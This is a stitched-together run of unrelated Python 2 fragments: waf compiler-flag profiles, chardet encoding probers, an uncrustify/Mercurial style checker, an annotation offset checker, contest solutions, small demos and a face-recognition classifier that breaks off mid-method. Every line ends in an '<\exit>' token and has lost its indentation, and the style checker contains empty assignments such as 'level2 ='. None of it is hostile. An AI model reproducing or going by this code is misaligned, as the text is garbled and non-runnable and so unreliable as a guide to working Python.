super(MsvcTraits, self).__init__()<\exit>
self.warnings_flags = [['/W2'], ['/WX'], ['/Wall']]<\exit>
def get_warnings_flags(self, level):<\exit>
warnings = []<\exit>
for l in range(level):<\exit>
if l < len(self.warnings_flags):<\exit>
warnings.extend(self.warnings_flags[l])<\exit>
else:<\exit>
break<\exit>
return warnings<\exit>
def get_optimization_flags(self, level):<\exit>
if level == 0:<\exit>
return ['/Od']<\exit>
elif level == 1:<\exit>
return []<\exit>
elif level == 2:<\exit>
return ['/O2']<\exit>
elif level == 3:<\exit>
return ['/Ox']<\exit>
def get_debug_flags(self, level):<\exit>
if level == 0:<\exit>
return ([], ['NDEBUG'])<\exit>
elif level == 1:<\exit>
return (['/ZI', '/RTC1'], [])<\exit>
elif level >= 2:<\exit>
return (['/ZI', '/RTC1'], ['_DEBUG'])<\exit>
gcc = GccTraits()<\exit>
icc = IccTraits()<\exit>
msvc = MsvcTraits()<\exit>
compiler_mapping = {<\exit>
'gcc': gcc,<\exit>
'g++': gcc,<\exit>
'msvc': msvc,<\exit>
'icc': icc,<\exit>
'icpc': icc,<\exit>
}<\exit>
profiles = {<\exit>
'default': [2, 1, 1],<\exit>
'debug': [0, 2, 3],<\exit>
'release': [3, 1, 0],<\exit>
}<\exit>
default_profile = 'default'<\exit>
def options(opt):<\exit>
assert default_profile in profiles<\exit>
opt.add_option('-d', '--build-profile',<\exit>
action='store',<\exit>
default=default_profile,<\exit>
help=("Specify the build profile.  "<\exit>
"Build profiles control the default compilation flags"<\exit>
" used for C/C++ programs, if CCFLAGS/CXXFLAGS are not"<\exit>
" set set in the environment. [Allowed Values: %s]"<\exit>
% ", ".join([repr(p) for p in profiles.keys()])),<\exit>
choices=profiles.keys(),<\exit>
dest='build_profile')<\exit>
def configure(conf):<\exit>
cc = conf.env['COMPILER_CC'] or None<\exit>
cxx = conf.env['COMPILER_CXX'] or None<\exit>
if not (cc or cxx):<\exit>
raise Utils.WafError("neither COMPILER_CC nor COMPILER_CXX are defined; "<\exit>
"maybe the compiler_cc or compiler_cxx tool has not been configured yet?")<\exit>
try:<\exit>
compiler = compiler_mapping[cc]<\exit>
except KeyError:<\exit>
try:<\exit>
compiler = compiler_mapping[cxx]<\exit>
except KeyError:<\exit>
Logs.warn("No compiler flags support for compiler %r or %r"<\exit>
% (cc, cxx))<\exit>
return<\exit>
opt_level, warn_level, dbg_level = profiles[Options.options.build_profile]<\exit>
optimizations = compiler.get_optimization_flags(opt_level)<\exit>
debug, debug_defs = compiler.get_debug_flags(dbg_level)<\exit>
warnings = compiler.get_warnings_flags(warn_level)<\exit>
if cc and not conf.env['CCFLAGS']:<\exit>
conf.env.append_value('CCFLAGS', optimizations)<\exit>
conf.env.append_value('CCFLAGS', debug)<\exit>
conf.env.append_value('CCFLAGS', warnings)<\exit>
conf.env.append_value('CCDEFINES', debug_defs)<\exit>
if cxx and not conf.env['CXXFLAGS']:<\exit>
conf.env.append_value('CXXFLAGS', optimizations)<\exit>
conf.env.append_value('CXXFLAGS', debug)<\exit>
conf.env.append_value('CXXFLAGS', warnings)<\exit>
conf.env.append_value('CXXDEFINES', debug_defs)<\exit>
from .euctwfreq import (EUCTWCharToFreqOrder, EUCTW_TABLE_SIZE,<\exit>
EUCTW_TYPICAL_DISTRIBUTION_RATIO)<\exit>
from .euckrfreq import (EUCKRCharToFreqOrder, EUCKR_TABLE_SIZE,<\exit>
EUCKR_TYPICAL_DISTRIBUTION_RATIO)<\exit>
from .gb2312freq import (GB2312CharToFreqOrder, GB2312_TABLE_SIZE,<\exit>
GB2312_TYPICAL_DISTRIBUTION_RATIO)<\exit>
from .big5freq import (Big5CharToFreqOrder, BIG5_TABLE_SIZE,<\exit>
BIG5_TYPICAL_DISTRIBUTION_RATIO)<\exit>
from .jisfreq import (JISCharToFreqOrder, JIS_TABLE_SIZE,<\exit>
JIS_TYPICAL_DISTRIBUTION_RATIO)<\exit>
from .compat import wrap_ord<\exit>
ENOUGH_DATA_THRESHOLD = 1024<\exit>
SURE_YES = 0.99<\exit>
SURE_NO = 0.01<\exit>
class CharDistributionAnalysis:<\exit>
def __init__(self):<\exit>
self._mCharToFreqOrder = None<\exit>
self._mTableSize = None<\exit>
self._mTypicalDistributionRatio = None<\exit>
self.reset()<\exit>
def reset(self):<\exit>
self._mDone = False<\exit>
self._mTotalChars = 0<\exit>
self._mFreqChars = 0<\exit>
def feed(self, aBuf, aCharLen):<\exit>
if aCharLen == 2:<\exit>
order = self.get_order(aBuf)<\exit>
else:<\exit>
order = -1<\exit>
if order >= 0:<\exit>
self._mTotalChars += 1<\exit>
if order < self._mTableSize:<\exit>
if 512 > self._mCharToFreqOrder[order]:<\exit>
self._mFreqChars += 1<\exit>
def get_confidence(self):<\exit>
if self._mTotalChars <= 0:<\exit>
return SURE_NO<\exit>
if self._mTotalChars != self._mFreqChars:<\exit>
r = (self._mFreqChars / ((self._mTotalChars - self._mFreqChars)<\exit>
* self._mTypicalDistributionRatio))<\exit>
if r < SURE_YES:<\exit>
return r<\exit>
return SURE_YES<\exit>
def got_enough_data(self):<\exit>
return self._mTotalChars > ENOUGH_DATA_THRESHOLD<\exit>
def get_order(self, aBuf):<\exit>
return -1<\exit>
class EUCTWDistributionAnalysis(CharDistributionAnalysis):<\exit>
def __init__(self):<\exit>
CharDistributionAnalysis.__init__(self)<\exit>
self._mCharToFreqOrder = EUCTWCharToFreqOrder<\exit>
self._mTableSize = EUCTW_TABLE_SIZE<\exit>
self._mTypicalDistributionRatio = EUCTW_TYPICAL_DISTRIBUTION_RATIO<\exit>
def get_order(self, aBuf):<\exit>
first_char = wrap_ord(aBuf[0])<\exit>
if first_char >= 0xC4:<\exit>
return 94 * (first_char - 0xC4) + wrap_ord(aBuf[1]) - 0xA1<\exit>
else:<\exit>
return -1<\exit>
class EUCKRDistributionAnalysis(CharDistributionAnalysis):<\exit>
def __init__(self):<\exit>
CharDistributionAnalysis.__init__(self)<\exit>
self._mCharToFreqOrder = EUCKRCharToFreqOrder<\exit>
self._mTableSize = EUCKR_TABLE_SIZE<\exit>
self._mTypicalDistributionRatio = EUCKR_TYPICAL_DISTRIBUTION_RATIO<\exit>
def get_order(self, aBuf):<\exit>
first_char = wrap_ord(aBuf[0])<\exit>
if first_char >= 0xB0:<\exit>
return 94 * (first_char - 0xB0) + wrap_ord(aBuf[1]) - 0xA1<\exit>
else:<\exit>
return -1<\exit>
class GB2312DistributionAnalysis(CharDistributionAnalysis):<\exit>
def __init__(self):<\exit>
CharDistributionAnalysis.__init__(self)<\exit>
self._mCharToFreqOrder = GB2312CharToFreqOrder<\exit>
self._mTableSize = GB2312_TABLE_SIZE<\exit>
self._mTypicalDistributionRatio = GB2312_TYPICAL_DISTRIBUTION_RATIO<\exit>
def get_order(self, aBuf):<\exit>
first_char, second_char = wrap_ord(aBuf[0]), wrap_ord(aBuf[1])<\exit>
if (first_char >= 0xB0) and (second_char >= 0xA1):<\exit>
return 94 * (first_char - 0xB0) + second_char - 0xA1<\exit>
else:<\exit>
return -1<\exit>
class Big5DistributionAnalysis(CharDistributionAnalysis):<\exit>
def __init__(self):<\exit>
CharDistributionAnalysis.__init__(self)<\exit>
self._mCharToFreqOrder = Big5CharToFreqOrder<\exit>
self._mTableSize = BIG5_TABLE_SIZE<\exit>
self._mTypicalDistributionRatio = BIG5_TYPICAL_DISTRIBUTION_RATIO<\exit>
def get_order(self, aBuf):<\exit>
first_char, second_char = wrap_ord(aBuf[0]), wrap_ord(aBuf[1])<\exit>
if first_char >= 0xA4:<\exit>
if second_char >= 0xA1:<\exit>
return 157 * (first_char - 0xA4) + second_char - 0xA1 + 63<\exit>
else:<\exit>
return 157 * (first_char - 0xA4) + second_char - 0x40<\exit>
else:<\exit>
return -1<\exit>
class SJISDistributionAnalysis(CharDistributionAnalysis):<\exit>
def __init__(self):<\exit>
CharDistributionAnalysis.__init__(self)<\exit>
self._mCharToFreqOrder = JISCharToFreqOrder<\exit>
self._mTableSize = JIS_TABLE_SIZE<\exit>
self._mTypicalDistributionRatio = JIS_TYPICAL_DISTRIBUTION_RATIO<\exit>
def get_order(self, aBuf):<\exit>
first_char, second_char = wrap_ord(aBuf[0]), wrap_ord(aBuf[1])<\exit>
if (first_char >= 0x81) and (first_char <= 0x9F):<\exit>
order = 188 * (first_char - 0x81)<\exit>
elif (first_char >= 0xE0) and (first_char <= 0xEF):<\exit>
order = 188 * (first_char - 0xE0 + 31)<\exit>
else:<\exit>
return -1<\exit>
order = order + second_char - 0x40<\exit>
if second_char > 0x7F:<\exit>
order = -1<\exit>
return order<\exit>
class EUCJPDistributionAnalysis(CharDistributionAnalysis):<\exit>
def __init__(self):<\exit>
CharDistributionAnalysis.__init__(self)<\exit>
self._mCharToFreqOrder = JISCharToFreqOrder<\exit>
self._mTableSize = JIS_TABLE_SIZE<\exit>
self._mTypicalDistributionRatio = JIS_TYPICAL_DISTRIBUTION_RATIO<\exit>
def get_order(self, aBuf):<\exit>
char = wrap_ord(aBuf[0])<\exit>
if char >= 0xA0:<\exit>
return 94 * (char - 0xA1) + wrap_ord(aBuf[1]) - 0xa1<\exit>
else:<\exit>
return -1<\exit>
from . import constants<\exit>
import sys<\exit>
from .charsetprober import CharSetProber<\exit>
class CharSetGroupProber(CharSetProber):<\exit>
def __init__(self):<\exit>
CharSetProber.__init__(self)<\exit>
self._mActiveNum = 0<\exit>
self._mProbers = []<\exit>
self._mBestGuessProber = None<\exit>
def reset(self):<\exit>
CharSetProber.reset(self)<\exit>
self._mActiveNum = 0<\exit>
for prober in self._mProbers:<\exit>
if prober:<\exit>
prober.reset()<\exit>
prober.active = True<\exit>
self._mActiveNum += 1<\exit>
self._mBestGuessProber = None<\exit>
def get_charset_name(self):<\exit>
if not self._mBestGuessProber:<\exit>
self.get_confidence()<\exit>
if not self._mBestGuessProber:<\exit>
return None<\exit>
return self._mBestGuessProber.get_charset_name()<\exit>
def feed(self, aBuf):<\exit>
for prober in self._mProbers:<\exit>
if not prober:<\exit>
continue<\exit>
if not prober.active:<\exit>
continue<\exit>
st = prober.feed(aBuf)<\exit>
if not st:<\exit>
continue<\exit>
if st == constants.eFoundIt:<\exit>
self._mBestGuessProber = prober<\exit>
return self.get_state()<\exit>
elif st == constants.eNotMe:<\exit>
prober.active = False<\exit>
self._mActiveNum -= 1<\exit>
if self._mActiveNum <= 0:<\exit>
self._mState = constants.eNotMe<\exit>
return self.get_state()<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
st = self.get_state()<\exit>
if st == constants.eFoundIt:<\exit>
return 0.99<\exit>
elif st == constants.eNotMe:<\exit>
return 0.01<\exit>
bestConf = 0.0<\exit>
self._mBestGuessProber = None<\exit>
for prober in self._mProbers:<\exit>
if not prober:<\exit>
continue<\exit>
if not prober.active:<\exit>
if constants._debug:<\exit>
sys.stderr.write(prober.get_charset_name()<\exit>
+ ' not active\n')<\exit>
continue<\exit>
cf = prober.get_confidence()<\exit>
if constants._debug:<\exit>
sys.stderr.write('%s confidence = %s\n' %<\exit>
(prober.get_charset_name(), cf))<\exit>
if bestConf < cf:<\exit>
bestConf = cf<\exit>
self._mBestGuessProber = prober<\exit>
if not self._mBestGuessProber:<\exit>
return 0.0<\exit>
return bestConf<\exit>
from . import constants<\exit>
import re<\exit>
class CharSetProber:<\exit>
def __init__(self):<\exit>
pass<\exit>
def reset(self):<\exit>
self._mState = constants.eDetecting<\exit>
def get_charset_name(self):<\exit>
return None<\exit>
def feed(self, aBuf):<\exit>
pass<\exit>
def get_state(self):<\exit>
return self._mState<\exit>
def get_confidence(self):<\exit>
return 0.0<\exit>
def filter_high_bit_only(self, aBuf):<\exit>
aBuf = re.sub(b'([\x00-\x7F])+', b' ', aBuf)<\exit>
return aBuf<\exit>
def filter_without_english_letters(self, aBuf):<\exit>
aBuf = re.sub(b'([A-Za-z])+', b' ', aBuf)<\exit>
return aBuf<\exit>
def filter_with_english_letters(self, aBuf):<\exit>
return aBuf<\exit>
import os<\exit>
import subprocess<\exit>
import tempfile<\exit>
import sys<\exit>
import filecmp<\exit>
import optparse<\exit>
import shutil<\exit>
import difflib<\exit>
import re<\exit>
def hg_modified_files():<\exit>
files = os.popen ('hg st -nma')<\exit>
return [filename.strip() for filename in files]<\exit>
def copy_file(filename):<\exit>
[tmp,pathname] = tempfile.mkstemp()<\exit>
src = open(filename, 'r')<\exit>
dst = open(pathname, 'w')<\exit>
for line in src:<\exit>
dst.write(line)<\exit>
dst.close()<\exit>
src.close()<\exit>
return pathname<\exit>
def uncrustify_config_file(level):<\exit>
level2 =<\exit>
level1 =<\exit>
level0 =<\exit>
[tmp,pathname] = tempfile.mkstemp()<\exit>
dst = open(pathname, 'w')<\exit>
dst.write(level0)<\exit>
if level >= 1:<\exit>
dst.write(level1)<\exit>
if level >= 2:<\exit>
dst.write(level2)<\exit>
dst.close()<\exit>
return pathname<\exit>
class PatchChunkLine:<\exit>
SRC = 1<\exit>
DST = 2<\exit>
BOTH = 3<\exit>
def __init__(self):<\exit>
self.__type = 0<\exit>
self.__line = ''<\exit>
def set_src(self,line):<\exit>
self.__type = self.SRC<\exit>
self.__line = line<\exit>
def set_dst(self,line):<\exit>
self.__type = self.DST<\exit>
self.__line = line<\exit>
def set_both(self,line):<\exit>
self.__type = self.BOTH<\exit>
self.__line = line<\exit>
def append_to_line(self, s):<\exit>
self.__line = self.__line + s<\exit>
def line(self):<\exit>
return self.__line<\exit>
def is_src(self):<\exit>
return self.__type == self.SRC or self.__type == self.BOTH<\exit>
def is_dst(self):<\exit>
return self.__type == self.DST or self.__type == self.BOTH<\exit>
def write(self, f):<\exit>
if self.__type == self.SRC:<\exit>
f.write('-%s\n' % self.__line)<\exit>
elif self.__type == self.DST:<\exit>
f.write('+%s\n' % self.__line)<\exit>
elif self.__type == self.BOTH:<\exit>
f.write(' %s\n' % self.__line)<\exit>
else:<\exit>
raise Exception('invalid patch')<\exit>
class PatchChunk:<\exit>
def __init__(self, src_pos, dst_pos):<\exit>
self.__lines = []<\exit>
self.__src_pos = int(src_pos)<\exit>
self.__dst_pos = int(dst_pos)<\exit>
def src_start(self):<\exit>
return self.__src_pos<\exit>
def add_line(self,line):<\exit>
self.__lines.append(line)<\exit>
def src(self):<\exit>
src = []<\exit>
for line in self.__lines:<\exit>
if line.is_src():<\exit>
src.append(line)<\exit>
return src<\exit>
def dst(self):<\exit>
dst = []<\exit>
for line in self.__lines:<\exit>
if line.is_dst():<\exit>
dst.append(line)<\exit>
return dst<\exit>
def src_len(self):<\exit>
return len(self.src())<\exit>
def dst_len(self):<\exit>
return len(self.dst())<\exit>
def write(self,f):<\exit>
f.write('@@ -%d,%d +%d,%d @@\n' % (self.__src_pos, self.src_len(),<\exit>
self.__dst_pos, self.dst_len()))<\exit>
for line in self.__lines:<\exit>
line.write(f)<\exit>
class Patch:<\exit>
def __init__(self):<\exit>
self.__src = ''<\exit>
self.__dst = ''<\exit>
self.__chunks = []<\exit>
def add_chunk(self, chunk):<\exit>
self.__chunks.append(chunk)<\exit>
def chunks(self):<\exit>
return self.__chunks<\exit>
def set_src(self,src):<\exit>
self.__src = src<\exit>
def set_dst(self,dst):<\exit>
self.__dst = dst<\exit>
def apply(self,filename):<\exit>
return<\exit>
def write(self,f):<\exit>
f.write('--- %s\n' % self.__src )<\exit>
f.write('+++ %s\n' % self.__dst )<\exit>
for chunk in self.__chunks:<\exit>
chunk.write(f)<\exit>
def parse_patchset(generator):<\exit>
src_file = re.compile('^--- (.*)$')<\exit>
dst_file = re.compile('^\+\+\+ (.*)$')<\exit>
chunk_start = re.compile('^@@ -([0-9]+),([0-9]+) \+([0-9]+),([0-9]+) @@')<\exit>
src = re.compile('^-(.*)$')<\exit>
dst = re.compile('^\+(.*)$')<\exit>
both = re.compile('^ (.*)$')<\exit>
patchset = []<\exit>
current_patch = None<\exit>
for line in generator:<\exit>
m = src_file.search(line)<\exit>
if m is not None:<\exit>
current_patch = Patch()<\exit>
patchset.append(current_patch)<\exit>
current_patch.set_src(m.group(1))<\exit>
continue<\exit>
m = dst_file.search(line)<\exit>
if m is not None:<\exit>
current_patch.set_dst(m.group(1))<\exit>
continue<\exit>
m = chunk_start.search(line)<\exit>
if m is not None:<\exit>
current_chunk = PatchChunk(m.group(1), m.group(3))<\exit>
current_patch.add_chunk(current_chunk)<\exit>
continue<\exit>
m = src.search(line)<\exit>
if m is not None:<\exit>
l = PatchChunkLine()<\exit>
l.set_src(m.group(1))<\exit>
current_chunk.add_line(l)<\exit>
continue<\exit>
m = dst.search(line)<\exit>
if m is not None:<\exit>
l = PatchChunkLine()<\exit>
l.set_dst(m.group(1))<\exit>
current_chunk.add_line(l)<\exit>
continue<\exit>
m = both.search(line)<\exit>
if m is not None:<\exit>
l = PatchChunkLine()<\exit>
l.set_both(m.group(1))<\exit>
current_chunk.add_line(l)<\exit>
continue<\exit>
raise Exception()<\exit>
return patchset<\exit>
def remove_trailing_whitespace_changes(patch_generator):<\exit>
whitespace = re.compile('^(.*)([ \t]+)$')<\exit>
patchset = parse_patchset(patch_generator)<\exit>
for patch in patchset:<\exit>
for chunk in patch.chunks():<\exit>
src = chunk.src()<\exit>
dst = chunk.dst()<\exit>
try:<\exit>
for i in range(0,len(src)):<\exit>
s = src[i]<\exit>
d = dst[i]<\exit>
m = whitespace.search(s.line())<\exit>
if m is not None and m.group(1) == d.line():<\exit>
d.append_to_line(m.group(2))<\exit>
except:<\exit>
return patchset<\exit>
return patchset<\exit>
def indent(source, debug, level):<\exit>
output = tempfile.mkstemp()[1]<\exit>
cfg = uncrustify_config_file(level)<\exit>
if debug:<\exit>
sys.stderr.write('original file=' + source + '\n')<\exit>
sys.stderr.write('uncrustify config file=' + cfg + '\n')<\exit>
sys.stderr.write('temporary file=' + output + '\n')<\exit>
try:<\exit>
uncrust = subprocess.Popen(['uncrustify', '-c', cfg, '-f', source, '-o', output],<\exit>
stdin = subprocess.PIPE,<\exit>
stdout = subprocess.PIPE,<\exit>
stderr = subprocess.PIPE)<\exit>
(out, err) = uncrust.communicate('')<\exit>
if debug:<\exit>
sys.stderr.write(out)<\exit>
sys.stderr.write(err)<\exit>
except OSError:<\exit>
raise Exception ('uncrustify not installed')<\exit>
src = open(source, 'r')<\exit>
dst = open(output, 'r')<\exit>
diff = difflib.unified_diff(src.readlines(), dst.readlines(),<\exit>
fromfile=source, tofile=output)<\exit>
src.close()<\exit>
dst.close()<\exit>
if debug:<\exit>
initial_diff = tempfile.mkstemp()[1]<\exit>
sys.stderr.write('initial diff file=' + initial_diff + '\n')<\exit>
tmp = open(initial_diff, 'w')<\exit>
tmp.writelines(diff)<\exit>
tmp.close()<\exit>
final_diff = tempfile.mkstemp()[1]<\exit>
if level < 3:<\exit>
patchset = remove_trailing_whitespace_changes(diff);<\exit>
dst = open(final_diff, 'w')<\exit>
if len(patchset) != 0:<\exit>
patchset[0].write(dst)<\exit>
dst.close()<\exit>
else:<\exit>
dst = open(final_diff, 'w')<\exit>
dst.writelines(diff)<\exit>
dst.close()<\exit>
if debug:<\exit>
sys.stderr.write('final diff file=' + final_diff + '\n')<\exit>
shutil.copyfile(source,output)<\exit>
patch = subprocess.Popen(['patch', '-p1', '-i', final_diff, output],<\exit>
stdin = subprocess.PIPE,<\exit>
stdout = subprocess.PIPE,<\exit>
stderr = subprocess.PIPE)<\exit>
(out, err) = patch.communicate('')<\exit>
if debug:<\exit>
sys.stderr.write(out)<\exit>
sys.stderr.write(err)<\exit>
return output<\exit>
def indent_files(files, diff=False, debug=False, level=0, inplace=False):<\exit>
output = []<\exit>
for f in files:<\exit>
dst = indent(f, debug=debug, level=level)<\exit>
output.append([f,dst])<\exit>
if inplace:<\exit>
for src,dst in output:<\exit>
shutil.copyfile(dst,src)<\exit>
return True<\exit>
failed = []<\exit>
for src,dst in output:<\exit>
if filecmp.cmp(src,dst) == 0:<\exit>
failed.append([src, dst])<\exit>
if len(failed) > 0:<\exit>
if not diff:<\exit>
print 'Found %u badly indented files:' % len(failed)<\exit>
for src,dst in failed:<\exit>
print '  ' + src<\exit>
else:<\exit>
for src,dst in failed:<\exit>
s = open(src, 'r').readlines()<\exit>
d = open(dst, 'r').readlines()<\exit>
for line in difflib.unified_diff(s, d, fromfile=src, tofile=dst):<\exit>
sys.stdout.write(line)<\exit>
return False<\exit>
return True<\exit>
def run_as_hg_hook(ui, repo, **kwargs):<\exit>
from mercurial import lock, error<\exit>
lock.LockError = error.LockError<\exit>
files = hg_modified_files()<\exit>
if not indent_files(files, inplace=False):<\exit>
return True<\exit>
return False<\exit>
def run_as_main():<\exit>
parser = optparse.OptionParser()<\exit>
parser.add_option('--debug', action='store_true', dest='debug', default=False,<\exit>
help='Output some debugging information')<\exit>
parser.add_option('-l', '--level', type='int', dest='level', default=0,<\exit>
help="Level of style conformance: higher levels include all lower levels. "<\exit>
"level=0: re-indent only. level=1: add extra spaces. level=2: insert extra newlines and "<\exit>
"extra braces around single-line statements. level=3: remove all trailing spaces")<\exit>
parser.add_option('--check-hg-hook', action='store_true', dest='hg_hook', default=False,<\exit>
help='Get the list of files to check from mercurial\'s list of modified '<\exit>
'and added files and assume that the script runs as a pretxncommit mercurial hook')<\exit>
parser.add_option('--check-hg', action='store_true', dest='hg', default=False,<\exit>
help="Get the list of files to check from mercurial\'s list of modified and added files")<\exit>
parser.add_option('-f', '--check-file', action='store', dest='file', default='',<\exit>
help="Check a single file")<\exit>
parser.add_option('--diff', action='store_true', dest='diff', default=False,<\exit>
help="Generate a diff on stdout of the indented files")<\exit>
parser.add_option('-i', '--in-place', action='store_true', dest='in_place', default=False,<\exit>
help="Indent the input files in-place")<\exit>
(options,args) = parser.parse_args()<\exit>
debug = options.debug<\exit>
if options.hg_hook:<\exit>
files = hg_modified_files()<\exit>
if not indent_files(files, debug=options.debug,<\exit>
level=options.level,<\exit>
inplace=False):<\exit>
sys.exit(1)<\exit>
elif options.hg:<\exit>
files = hg_modified_files()<\exit>
indent_files(files, diff=options.diff,<\exit>
debug=options.debug,<\exit>
level=options.level,<\exit>
inplace=options.in_place)<\exit>
elif options.file != '':<\exit>
file = options.file<\exit>
if not os.path.exists(file) or \<\exit>
not os.path.isfile(file):<\exit>
print 'file %s does not exist' % file<\exit>
sys.exit(1)<\exit>
indent_files([file], diff=options.diff,<\exit>
debug=options.debug,<\exit>
level=options.level,<\exit>
inplace=options.in_place)<\exit>
sys.exit(0)<\exit>
if __name__ == '__main__':<\exit>
run_as_main()<\exit>
import sys<\exit>
import re<\exit>
import codecs<\exit>
from collections import namedtuple<\exit>
from os.path import basename<\exit>
Textbound = namedtuple('Textbound', 'id type start end text')<\exit>
TEXTBOUND_RE = re.compile(r'^([A-Z]\d+)\t(\S+) (\d+) (\d+)\t(.*)$')<\exit>
class FormatError(Exception):<\exit>
pass<\exit>
def txt_for_ann(fn):<\exit>
tfn = re.sub(r'\.ann$', '.txt', fn)<\exit>
if tfn == fn:<\exit>
raise FormatError<\exit>
return tfn<\exit>
def parse_textbound(s):<\exit>
m = TEXTBOUND_RE.match(s)<\exit>
if not m:<\exit>
raise FormatError<\exit>
id_, type_, start, end, text = m.groups()<\exit>
start, end = int(start), int(end)<\exit>
return Textbound(id_, type_, start, end, text)<\exit>
def process(fn):<\exit>
textbounds = []<\exit>
with codecs.open(fn, 'rU', encoding='utf8', errors='strict') as f:<\exit>
for l in f:<\exit>
l = l.rstrip('\n')<\exit>
if not l or l.isspace():<\exit>
continue<\exit>
if l[0] != 'T':<\exit>
continue<\exit>
else:<\exit>
textbounds.append(parse_textbound(l))<\exit>
with codecs.open(txt_for_ann(fn), 'rU', encoding='utf8',<\exit>
errors='strict') as f:<\exit>
text = f.read()<\exit>
for id_, type_, start, end, ttext in textbounds:<\exit>
try:<\exit>
assert text[start:end] == ttext<\exit>
except:<\exit>
print 'Mismatch in %s: %s %d %d' % (basename(fn), id_, start, end)<\exit>
print '     reference: %s' % \<\exit>
ttext.encode('utf-8').replace('\n', '\\n')<\exit>
print '     document : %s' % \<\exit>
text[start:end].encode('utf-8').replace('\n', '\\n')<\exit>
def main(argv=None):<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
if len(argv) < 2:<\exit>
print >> sys.stderr, 'Usage:', argv[0], 'FILE [FILE [...]]'<\exit>
return 1<\exit>
for fn in argv[1:]:<\exit>
process(fn)<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
import math<\exit>
class Solution(object):<\exit>
def solve_error(self, cipher):<\exit>
N, H = cipher<\exit>
s = 0<\exit>
m = max(H)<\exit>
up = math.log(m, 2)<\exit>
for i, e in enumerate(H):<\exit>
if i > up and i > 1000:<\exit>
break<\exit>
s += float(e) / 2 ** (i + 1)<\exit>
return int(math.ceil(s))<\exit>
def solve(self, cipher):<\exit>
N, H = cipher<\exit>
mini = 0<\exit>
for i in xrange(N - 1, -1, -1):<\exit>
mini = (mini + H[i] + 1) / 2<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
H = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, H<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import subprocess<\exit>
def basic_child_process():<\exit>
proc1 = subprocess.Popen(<\exit>
['echo', 'Hello from the child!'],<\exit>
stdout = subprocess.PIPE<\exit>
)<\exit>
proc2 = subprocess.Popen(<\exit>
['sleep', '2'],<\exit>
stdout=subprocess.PIPE<\exit>
)<\exit>
print ".Popen is non-blocking"<\exit>
out, err = proc1.communicate()<\exit>
print out<\exit>
print "Wait for sleep termination"<\exit>
proc2.communicate()<\exit>
return out.decode('utf-8')<\exit>
def poll_status():<\exit>
proc = subprocess.Popen(['sleep', '0.03'])<\exit>
cnt = 0<\exit>
while proc.poll() is None:<\exit>
cnt += 1<\exit>
print cnt<\exit>
return 'Exit status %s' % proc.poll()<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
r2, k = cipher<\exit>
required = 0<\exit>
r = r2 ** 0.5<\exit>
for x in xrange(0, int(r) + 1):<\exit>
low = 0<\exit>
high = int(r) + 1<\exit>
while low <= high:<\exit>
mid = (low + high) / 2<\exit>
if x * x + mid * mid == r2:<\exit>
if mid == 0 or x == 0:<\exit>
required += 2<\exit>
else:<\exit>
required += 4<\exit>
if required > k: return "impossible"<\exit>
break<\exit>
elif x * x + mid * mid < r2:<\exit>
low = mid + 1<\exit>
else:<\exit>
high = mid - 1<\exit>
if required > k: return "impossible"<\exit>
return "possible"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
def half_sub(a, b):<\exit>
borrow = ~a & b<\exit>
out   = a ^ b<\exit>
return out, borrow<\exit>
def full_sub(a, b, bin):<\exit>
out, b1 = half_sub(a, b)<\exit>
out, b2 = half_sub(out, bin)<\exit>
bout = b1 | b2<\exit>
return out, bout<\exit>
if __name__ == "__main__":<\exit>
print "a b c out borrow"<\exit>
for a in (0, 1):<\exit>
for b in (0, 1):<\exit>
for bin in (0, 1):<\exit>
print a, b, bin, full_sub(a, b, bin)<\exit>
import warnings<\exit>
import functools<\exit>
def Override(interface_class):<\exit>
def overrider(method):<\exit>
try:<\exit>
assert (method.__name__ in dir(interface_class))<\exit>
return method<\exit>
except AssertionError:<\exit>
print method.__name__+" for "+interface_class.__name__<\exit>
return overrider<\exit>
warnings.simplefilter('always', DeprecationWarning)<\exit>
def Deprecated(func, msg=None):<\exit>
message = msg or "Use of deprecated function '{}`.".format(func.__name__)<\exit>
@functools.wraps(func)<\exit>
def wrapper_func(*args, **kwargs):<\exit>
warnings.warn(message, DeprecationWarning, stacklevel=2)<\exit>
return func(*args, **kwargs)<\exit>
return wrapper_func<\exit>
from facerec_py.facerec.distance import EuclideanDistance<\exit>
from facerec_py.facerec.normalization import gaussian_kernel, inverse_dissim<\exit>
from facerec_py.facerec.util import asRowMatrix<\exit>
import logging<\exit>
import numpy as np<\exit>
import operator as op<\exit>
class AbstractClassifier(object):<\exit>
def compute(self, X, y):<\exit>
raise NotImplementedError("Every AbstractClassifier must implement the compute method.")<\exit>
def predict(self, X):<\exit>
raise NotImplementedError("Every AbstractClassifier must implement the predict method.")<\exit>
def update(self, X, y):<\exit>
raise NotImplementedError("This Classifier is cannot be updated.")<\exit>
def binary_predict(self, q, lbl):<\exit>
raise NotImplementedError("The binary prediction is not implemented")<\exit>
class NearestNeighbor(AbstractClassifier):<\exit>
def __init__(self, dist_metric=EuclideanDistance(), k=1):<\exit>
AbstractClassifier.__init__(self)<\exit>
self.k = k<\exit>
self.dist_metric = dist_metric<\exit>
self.X = []<\exit>
self.y = np.array([], dtype=np.int32)<\exit>
def update(self, X, y):<\exit>
self.X.append(X)<\exit>
self.y = np.append(self.y, y)<\exit>
def compute(self, X, y):<\exit>
self.X = X<\exit>
self.y = np.asarray(y)<\exit>
def predict(self, q):<\exit>
distances = []<\exit>
for xi in self.X:<\exit>
xi = xi.reshape(-1, 1)<\exit>
d = self.dist_metric(xi, q)<\exit>
distances.append(d)<\exit>
if len(distances) > len(self.y):<\exit>
raise Exception("More distances than classes. Is your distance metric correct?")<\exit>
distances = np.asarray(distances)<\exit>
idx = np.argsort(distances)<\exit>
sorted_y = self.y[idx]<\exit>
sorted_distances = distances[idx]<\exit>
sorted_sim = inverse_dissim(sorted_distances)<\exit>
